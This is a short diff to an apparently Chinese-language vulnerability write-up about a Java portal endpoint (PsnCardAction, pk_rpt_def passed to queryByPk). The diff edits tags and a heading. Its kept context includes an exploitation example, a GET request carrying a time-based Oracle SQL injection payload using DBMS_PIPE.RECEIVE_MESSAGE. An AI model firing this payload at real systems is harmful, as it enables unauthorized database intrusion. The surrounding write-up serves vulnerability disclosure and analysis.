@@ -63,14 +63,6 @@ public class PsnCardAction extends BaseAction {
             FileInputStream finput = null;
 ```
 
-深入探索
-
-计算机安全
-
-数据管理
-
-黑客与破解
-
 `pk_rpt_def` 带入 queryByPk 函数
 
 编程
@@ -111,7 +103,7 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用示例
 
-计算机服务器
+代码注入检测
 
 ```
 GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
